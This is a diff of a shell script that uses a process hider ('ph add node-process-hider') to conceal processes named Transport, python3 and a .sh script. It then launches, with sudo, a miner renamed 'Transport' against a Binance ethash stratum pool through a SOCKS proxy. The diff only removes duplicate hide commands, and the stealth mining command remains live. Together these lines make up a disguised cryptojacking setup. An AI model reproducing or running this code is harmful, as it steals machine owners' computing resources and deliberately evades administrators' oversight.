@@ -15,25 +15,5 @@ sleep 9
 ph add node-process-hider
 sleep 9
 ph add Transport
-sleep 9
-ph add BlackholesCalculatorTransport.sh
-sleep 9
-ph add python3
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add node-process-hider
-sleep 9
-ph add Transport
-sleep 9
-ph add  BlackholesCalculatorTransport.sh
-sleep 9
-ph add python3
-sleep 9
-ph add Transport
-sleep 9
+sleep 30
 sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u Gok001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 46.174.43.18:1080 
